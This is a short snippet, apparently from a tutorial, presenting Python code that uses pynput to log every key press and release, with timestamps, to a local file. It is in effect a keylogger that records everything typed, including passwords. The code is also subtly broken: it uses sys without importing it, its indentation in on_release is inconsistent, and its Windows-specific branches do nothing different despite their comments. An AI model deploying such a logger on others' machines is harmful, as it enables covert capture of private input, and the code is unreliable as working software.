**Python Logging Approach**

Python’s rich logging module combined with keyboard hooks makes this very manageable.

```python
import logging
import pynput  # Install with: pip install pynput
from datetime import datetime

logging.basicConfig(filename='keyboard_log.txt', level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")

def on_press(key):
    try:
        if sys.platform == 'win32':
            #Windows Specific Encoding conversion needed
             string = str(key.char) 
        else :
           string = str(key.char)

        logging.debug(f"{datetime.now()} - Pressed: {string}")
    except AttributeError: #Handle non-character events (Ctrl+C, Arrow Keys...)
       logging.debug(f"{datetime.now()} - Non-Character Event:{key} ")

def on_release(key):
    try:
         if sys.platform == 'win32':
            #Windows Specific encoding
             string = str(key.char)
         else:
              string = str(key.char)


        logging.debug(f"{datetime.now()} - Released: {string}")
    except AttributeError:
        pass



# Start listener
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
